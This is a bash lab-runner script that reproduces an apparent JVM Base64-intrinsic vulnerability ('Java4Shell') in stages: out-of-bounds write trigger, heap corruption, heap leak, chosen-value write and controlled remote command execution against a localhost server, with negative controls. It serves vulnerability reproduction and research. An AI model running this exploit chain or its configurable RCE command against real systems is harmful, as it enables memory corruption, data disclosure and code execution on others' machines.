#!/usr/bin/env bash
# Java4Shell (CVE-2026-114938) lab runner.
#
# Usage: run-lab [trigger|control|corrupt|leak|write|rce|rce-control|all]
#
#   trigger      bounded, non-destructive OOB-write measurement
#   control      same trigger with -XX:-UseBASE64Intrinsics (must not reproduce)
#   corrupt      overwrite a neighbouring array's length + OOB read
#   leak         JavaBleed-style heap disclosure (marker in a neighbour array)
#   write        use the corrupted length for a chosen-value OOB write
#   rce          controlled RCE: corruption -> OOB read -> command execution
#   rce-control  same as rce, but with -XX:-UseBASE64Intrinsics (must not reproduce)
#   all          run the five base stages (default)
#
# Environment:
#   LAB_MODE=native|sde|auto   (default auto)
#   LAB_WARMUP=N               (default 1000; use 200000 for a fully warm
#                               decoder without -Xcomp on real hardware)
#   LAB_RCE_CMD="..."          command the RCE client asks the target to run

set -uo pipefail

MODE="${LAB_MODE:-auto}"
TEST="${1:-all}"
WARMUP="${LAB_WARMUP:-1000}"
CLASSES=/opt/lab/classes
SDE=/opt/sde/sde64

JVM_OPTS=(-Xcomp -XX:-TieredCompilation)
EXTRA_OPTS=()
# JIT-only options for the controlled RCE stage: compile the Base64 decoder
# (and only that) with C2, so the AVX-512 stub is generated without paying
# the cost of compiling the whole HttpServer under SDE.
RCE_OPTS=(-Xcomp -XX:-TieredCompilation \
          -XX:+UnlockExperimentalVMOptions -XX:+UseEpsilonGC \
          -Xms512m -Xmx512m)

cpu_has_avx512() {
    # All four are required by the vulnerable decoder.
    [ "$(uname -m)" = "x86_64" ] || return 1
    for f in avx512f avx512bw avx512vbmi bmi2; do
        grep -qw "$f" /proc/cpuinfo || return 1
    done
    return 0
}

case "$MODE" in
    native)
        RUNNER=(java)
        ;;
    sde)
        RUNNER=("$SDE" -chip_check_disable -icx -- java)
        ;;
    auto)
        if cpu_has_avx512; then
            RUNNER=(java)
            MODE=native
        else
            RUNNER=("$SDE" -chip_check_disable -icx -- java)
            MODE=sde
        fi
        ;;
    *)
        echo "LAB_MODE must be native, sde or auto" >&2
        exit 2
        ;;
esac

RUNNER_NAME="${RUNNER[0]##*/}"

run() {
    local cls="$1"
    shift
    "${RUNNER[@]}" "${JVM_OPTS[@]}" "${EXTRA_OPTS[@]}" -cp "$CLASSES" "$cls" "$@"
}

banner() {
    echo
    echo "==================================================================="
    echo " $1"
    echo " runner=$RUNNER_NAME  mode=$MODE  warmup=$WARMUP"
    echo "==================================================================="
}

do_trigger() {
    EXTRA_OPTS=()
    banner "bounded trigger (real 64-byte masked store)"
    run Base64Trigger --warmup "$WARMUP" --show-bytes
}

do_control() {
    EXTRA_OPTS=(-XX:-UseBASE64Intrinsics)
    banner "control: -XX:-UseBASE64Intrinsics"
    run Base64Trigger --warmup "$WARMUP" --show-bytes
}

do_corrupt() {
    EXTRA_OPTS=()
    banner "heap corruption: victim array length + OOB read"
    run HeapCorruption --warmup "$WARMUP" --dst-size 66 --show-length --oob-index 4096
}

do_leak() {
    EXTRA_OPTS=()
    banner "JavaBleed: read a neighbouring secret array"
    run HeapLeak --warmup "$WARMUP" --scan 8192
}

do_write() {
    EXTRA_OPTS=()
    banner "heap read/write: chosen-value OOB write into a neighbour"
    run HeapWrite --warmup "$WARMUP"
}

rce_run() {
    # $1 = mode label, $2 = extra JVM flags (space-free array passed via name)
    local label="$1"
    local extra_mode="$2"
    local port=18080
    local log="/tmp/rce-server-${label}.log"
    : > "$log"

    local -a opts=("${RCE_OPTS[@]}")
    if [ "$extra_mode" = "control" ]; then
        opts+=(-XX:-UseBASE64Intrinsics)
    fi

    banner "controlled RCE: ${label} (heap corruption -> OOB read -> exec)"
    "${RUNNER[@]}" "${opts[@]}" -cp "$CLASSES" RceLab --port "$port" --warmup "$WARMUP" >>"$log" 2>&1 &
    local pid=$!
    cleanup() { kill "$pid" 2>/dev/null; wait "$pid" 2>/dev/null; }
    trap 'cleanup' RETURN INT TERM

    local up=0
    for i in $(seq 1 900); do
        if curl -fsS "http://127.0.0.1:$port/health" >/dev/null 2>&1; then up=1; break; fi
        if ! kill -0 "$pid" 2>/dev/null; then break; fi
        sleep 1
    done

    if [ "$up" != 1 ]; then
        echo "server failed to start (see $log)"
        tail -40 "$log"
        return 1
    fi
    echo "server ready (pid $pid)"

    local rc=0
    java -cp "$CLASSES" RceClient "http://127.0.0.1:$port" "${LAB_RCE_CMD:-${RCE_CMD:-id; uname -a}}" || rc=$?

    # In control mode, the expected result is "no corruption", i.e. client exit 1.
    if [ "$extra_mode" = "control" ]; then
        if [ "$rc" = 1 ]; then
            echo "[rce-control] OK: no RCE without the vulnerable intrinsic"
            rc=0
        fi
    fi

    cleanup
    trap - RETURN INT TERM
    return "$rc"
}

do_rce() {
    rce_run "vulnerable" "vuln"
}

do_rce_control() {
    rce_run "control" "control"
}

case "$TEST" in
    trigger) do_trigger ;;
    control) do_control ;;
    corrupt) do_corrupt ;;
    leak)    do_leak ;;
    write)   do_write ;;
    rce)     do_rce ;;
    rce-control) do_rce_control ;;
    all)
        do_trigger; echo "[trigger] exit=$?"
        do_control; echo "[control] exit=$?"
        do_corrupt; echo "[corrupt] exit=$?"
        do_leak;    echo "[leak]    exit=$?"
        do_write;   echo "[write]   exit=$?"
        echo
        echo "Done. Expected: trigger=REPRODUCED, control=NOT REPRODUCED,"
        echo "corrupt=OOB READ REPRODUCED, leak=JAVA BLEED REPRODUCED,"
        echo "write=OOB WRITE REPRODUCED."
        echo
        echo "Optional: ./run.sh rce            (controlled RCE, ~3 min)"
        echo "          ./run.sh rce-control    (negative control)"
        ;;
    *)
        echo "usage: $0 [trigger|control|corrupt|leak|write|rce|rce-control|all]" >&2
        exit 2
        ;;
esac
